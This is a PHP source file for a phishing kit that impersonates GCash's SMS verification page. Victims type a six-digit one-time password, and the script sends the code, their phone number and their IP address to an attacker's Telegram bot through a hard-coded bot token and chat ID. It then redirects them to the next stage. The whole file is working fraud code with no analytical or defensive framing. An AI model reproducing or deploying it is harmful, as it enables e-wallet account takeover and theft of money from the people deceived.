<?php

$_GET['x'];
$_GET['otpclid'];
extract($_GET);
$test = $_GET['otpclid'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("m-d-y");
setcookie("gcash_number", "", time()-3600);
$mobile_num = $_COOKIE['gcash_number'];

error_reporting(0);




	function telegramBot($txt) {
	$url = "https://api.telegram.org/bot1745982631:AAH5Ah2sMYmK7IGXRW25KS8dFmsDQYEG400/sendMessage?";
	$timestamp = date("c", strtotime("now"));
	$json_data = json_encode([

	    "chat_id" => "-617925269",
	    "text"	  => $txt
	   

	], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

	$ch = curl_init( $url );
	curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
	curl_setopt( $ch, CURLOPT_POST, 1);
	curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt( $ch, CURLOPT_HEADER, 0);
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

	$response = curl_exec( $ch );
	curl_close( $ch );
	}
if(isset($_GET['x']))
{
$gcash_number = base64_encode(base64_encode($_COOKIE["number"]));
$from = base64_decode(base64_decode($gcash_number));
  header('location: otpsave.php?otpclid2='.$from.'');  
}

if(isset($_GET['otpclid2'])){
    
}
if(isset($_GET['otpclid'])){
    $valued = $_GET['otpclid'];
    $nice = "RELOGIN $valued";
     telegramBot($nice);
}
if(isset($_POST['submitotp'])){
     //$_SESSION['sucksess'] = 1;
     $numotp = $_POST['otp'].$_POST['otp1'].$_POST['otp2'].$_POST['otp3'].$_POST['otp4'].$_POST['otp5'];
    $rez = "VERIFICATION CODE\n $test \n <br>$numotp\n";
    telegramBot($rez);
   header('location: r.php');
   
    exit;
}
if(isset($_GET['resendotp'])){
   $replyMsg = "  Date: $date \n Logged [ $ip ] \n Resend OTP";
    telegramBot($replyMsg);
  }
echo '<!DOCTYPE html>
<html>
<head>
<title>GCash OTP</title>
<link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
  $("input").keypress(function(){
   if ( $(this).val().length > 1){
    $(this).addClass(\'active\');
    }
  });

  function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  }
  return true;
   }

</script>';
echo "
<script>

  $(document).ready(function(){

    $('body').on('keyup', 'input.otp', function()
    {
      var key = event.keyCode || event.charCode;
      var inputs = $('input.otp');
      if(($(this).val().length === this.size) && key != 32)
      {
        inputs.eq(inputs.index(this) + 1).focus();
      }
      if( key == 8 || key == 46 )
      {
        var indexNum = inputs.index(this);
        if(indexNum != 0)
        {
        inputs.eq(inputs.index(this) - 1).val('').focus();
        }
      }

    });
  });</script>";

echo '
<link rel="stylesheet" href="css/otp.css">

<style>
body {
color:light-gray;
margin:0;
padding:0;
font-family: Karla,sans-serif;
text-align:center;
-webkit-touch-callout: none;
    -webkit-user-select: none;
     -khtml-user-select: none;
       -moz-user-select: none;
        -ms-user-select: none;
            user-select: none;
}

#otpdisable {
background-color:#0079FC;
border: none;
margin:5px;
padding:11px;
cursor:pointer;
color: white;
text-align: center;
font-size:16px;
outline:none;
border-radius: 35px;
width:280px;
}

#otpdisable:disabled {
background-color:#9fcbff;;
border: none;
margin:5px;
padding:11px;
color: white;
text-align: center;
font-size:16px;
outline:none;
border-radius: 35px;
width:280px;
}

.otp{
     font: 4.7ch consolas, monospace;
     border:0;
     width: 1.4ch;
     border-bottom: 2px solid dimgrey;
     letter-spacing: .5ch;
     color: dimblack;


}


.otp:focus{
    outline: none;
    color: dodgerblack;
}



span{
    font-size:15px;
}

.header{
  background:#ecf1fa;
  padding:10px;
  margin-left:10px;
  margin-right:10px;
  letter-spacing:0.2px;
}




$char-w: 1ch;
$gap: .5*$char-w;
$n-char: 7;
$in-w: $n-char*($char-w + $gap);

.otpotp {
  border: none;
  width: 8.83ch;
  background:
    repeating-linear-gradient(90deg,
        dimgrey 0,
        dimgrey 1ch,
        transparent 0,
        transparent 1.5ch)
      0 100%/100% 2px no-repeat;
  color: dimgrey;
  font: 5ch consolas, monospace;
  letter-spacing: .5ch;
}
.otpotp:focus {
  outline: none;
  color: dodgerblack;
}

.otp_img{
    content: url(Gcash_files/otp.png);
    margin-top:10px;
    width:75px;
    height:100px;
    margin-left: auto;
    margin-right: auto
}

</style>
</head>
<body>
<div class="otp_img"></div>
<br><div class="header">
<label><b>Verify with Text Message</b></label><br>
<span>We sent a 6-digit authentication code<br>to your registered mobile number
</span>

<br>
';


echo "<span><b>+63" . $test . '</b></span>


</div>
';
echo '
<div id="countdown"></div>
<br>

<script>

var timeLeft = 200;
    var elem = document.getElementById(\'countdown\');

    var timerId = setInterval(countdown, 1000);

    function countdown() {
      if (timeLeft == -1) {
        clearTimeout(timerId);
        doSomething();

      } else {
        elem.innerHTML = \' <br><span>Resend OTP in <b>\'+timeLeft + \'s</b></span>\';
        timeLeft--;
      }

      if (timeLeft == "0"){
           window.location.reload(true);
      }
    }



</script>
';

echo '

<span>Please enter the authentication code.</span>

<br><br>';


echo '<form method="post">

<center>
<div class="otpnum">
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode1" name="otp" type="tel" size="1" maxlength="1" autofocus="autofocus" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode2" name="otp1" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode3" name="otp2" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode4" name="otp3" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode5" name="otp4" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode6" name="otp5" type="tel" size="1" maxlength="1" required>

   </div>

</center>

<script language="javascript">



function submitOTP()
{
window.location.reload(true);
window.location = "#resendotp";
}

function OTPInput() {
  const inputs = document.querySelectorAll(\'#otpnum > *[id]\');
  for (let i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener(\'keydown\', function(event) {
      if (event.key === "Backspace") {
        inputs[i].value = \'\';
        if (i !== 0)
          inputs[i - 1].focus();
      } else {
        if (i === inputs.length - 1 && inputs[i].value !== \'\') {
          return true;
        } else if (event.keyCode > 47 && event.keyCode < 58) {
          inputs[i].value = event.key;
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        } else if (event.keyCode > 64 && event.keyCode < 91) {
          inputs[i].value = String.fromCharCode(event.keyCode);
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        }
      }
    });
  }
}
OTPInput();

</script><br><br>
';
echo "
<span>Didn't get code? <a style='text-decoration:none;' href='?otpclid=$number_encode&resendotp' id='myHref'><b style='color:#0079FC;'>Tap here to resend</b></a></span>
<script>
$('#myHref').on('click', function() {
  window.location = 'otp.php?otpclid=$number_encode&otpresend=9fed15500455f3fc177ef823fa53ae4f';
});";

// OTP RESEND SYSTEM

if (!empty($_GET['otpresend'] == md5("resendotp"))){
    $replyMsg = "Logged [ $ip ] \nResend OTP";
    include('Gcash_files/tele_bot.php');
}


echo '
</script>
<br><br/><br>
<input type="submit" name="submitotp" id="otpdisable" value="submit" disabled>

<script>
function length_disabled_btn(value){


         var otp1 = document.getElementById("otpcode1").value;
         var otp2 = document.getElementById("otpcode2").value;
         var otp3 = document.getElementById("otpcode3").value;
         var otp4 = document.getElementById("otpcode4").value;
         var otp5 = document.getElementById("otpcode5").value;
         var otp6 = document.getElementById("otpcode6").value;

         var otp1_length = otp1.toString().length;
         var otp2_length = otp2.toString().length;
         var otp3_length = otp3.toString().length;
         var otp4_length = otp4.toString().length;
         var otp5_length = otp5.toString().length;
         var otp6_length = otp6.toString().length;


     if(otp1_length == "1" && otp2_length == "1" && otp3_length == "1" && otp4_length == "1" && otp5_length == "1" && otp6_length == "1"){
          document.getElementById("otpdisable").disabled = false;
        }
      else{

          document.getElementById("otpdisable").disabled = true;
      }

}

</script>
</form>

</body></html>';

?>
